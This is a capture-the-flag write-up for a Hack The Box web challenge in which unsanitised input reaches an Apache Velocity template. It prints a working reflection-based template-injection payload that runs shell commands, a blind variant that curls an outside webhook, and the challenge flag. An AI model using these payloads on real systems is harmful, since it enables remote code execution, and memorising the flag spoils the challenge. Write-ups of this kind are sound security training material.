# Challenge source file
URL: [https://1drv.ms/u/c/4ab09e7ce6bb4141/EfXqEQZSRPZDgxaQe8LG4cEBwVpGpE4wNO0b8Di3_7CL7w?e=ivY54A](https://1drv.ms/u/c/4ab09e7ce6bb4141/EfXqEQZSRPZDgxaQe8LG4cEBwVpGpE4wNO0b8Di3_7CL7w?e=ivY54A)

# Difficulty
Easy

# Author
Hack The Box team

# Approach
- The website is a machine that can convert English to a language called Voxalith (idk what is it). It also funny tho:
  ![image](https://github.com/NoSpaceAvailable/HackTheBox-Cyber-Apocalypse-CTF-2024/assets/143888307/017ecdfd-522c-4edf-a7eb-5a57bab00b39)

- It's time to read the source:
- In *entrypoint.sh*, the flag is at /, but it was renamed to a random name, so this challenge require us to perform RCE:
```
#!/bin/bash

# Change flag name
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt

# Secure entrypoint
chmod 600 /entrypoint.sh

# Start application
/usr/bin/supervisord -c /etc/supervisord.conf
```

- Let's take a look at *Main.java*:
  
```java
import java.io.*;
import java.util.HashMap;
import org.springframework.boot.*;
import org.springframework.boot.autoconfigure.*;
import org.springframework.stereotype.*;
import org.springframework.web.bind.annotation.*;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.runtime.RuntimeServices;
import org.apache.velocity.runtime.RuntimeSingleton;
import org.apache.velocity.runtime.parser.ParseException;

@Controller
@EnableAutoConfiguration
public class Main {

	@RequestMapping("/")
	@ResponseBody
	String index(@RequestParam(required = false, name = "text") String textString) {
		if (textString == null) {
			textString = "Example text";
		}

		String template = "";

        try {
            template = readFileToString("/app/src/main/resources/templates/index.html", textString);
        } catch (IOException e) {
            e.printStackTrace();
        }

		RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
		StringReader reader = new StringReader(template);

		org.apache.velocity.Template t = new org.apache.velocity.Template();
		t.setRuntimeServices(runtimeServices);
		try {

			t.setData(runtimeServices.parse(reader, "home"));
			t.initDocument();
			VelocityContext context = new VelocityContext();
			context.put("name", "World");

			StringWriter writer = new StringWriter();
			t.merge(context, writer);
			template = writer.toString();

		} catch (ParseException e) {
			e.printStackTrace();
		}

		return template;
	}

	public static String readFileToString(String filePath, String replacement) throws IOException {
        StringBuilder content = new StringBuilder();
        BufferedReader bufferedReader = null;

        try {
            bufferedReader = new BufferedReader(new FileReader(filePath));
            String line;
            
            while ((line = bufferedReader.readLine()) != null) {
                line = line.replace("TEXT", replacement);
                content.append(line);
                content.append("\n");
            }
        } finally {
            if (bufferedReader != null) {
                try {
                    bufferedReader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return content.toString();
    }

	public static void main(String[] args) throws Exception {
		System.getProperties().put("server.port", 1337);
		SpringApplication.run(Main.class, args);
	}
}

```

- Generally say, the code above receive user input, then render it using Velocity template engine and combine the result with *index.html*. Notice that the user input is not sanitized, so there is a possible SSTI attack here.
- I tried to fuzz with some basic payload to prove my assumtion. And this is what happened:

  ![image](https://github.com/NoSpaceAvailable/HackTheBox-Cyber-Apocalypse-CTF-2024/assets/143888307/5a280565-9e5d-4145-bb79-68734f7720bb)

- It proved that I can perform a SSTI attack here.

# Problem-solving
- I'm not familiar with Java and Velocity either, so I search for writeups and Velocity's documentation. After a few hours, I ran into [this post](https://www.linkedin.com/pulse/apache-velocity-server-side-template-injection-marjan-sterjev)
- The payload which I used during the competition:
```
#set($s="")
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
#set($readerClass=$stringClass.forName("java.io.Reader"))
#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
#set($systemClass=$stringClass.forName("java.lang.System"))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("whoami"))
#set($null=$process.waitFor() )
#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())
#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))
$output
```

![image](https://github.com/NoSpaceAvailable/HackTheBox-Cyber-Apocalypse-CTF-2024/assets/143888307/0ce9f647-3799-45cb-a79c-d0c2c9d809a0)

- I can *Cat The Flag* now.

- After the competition end, the challenge author uploaded their payload to perform blind SSTI. During the competition, I also tried to perform blind SSTI but it's not working. Idk what was happened, but this is a working payload from author (and better than above):
```
#set($engine="")
#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("curl <webhook here>"))
#set($null=$proc.waitFor())
${{null}}
``` 

- Flag: HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}
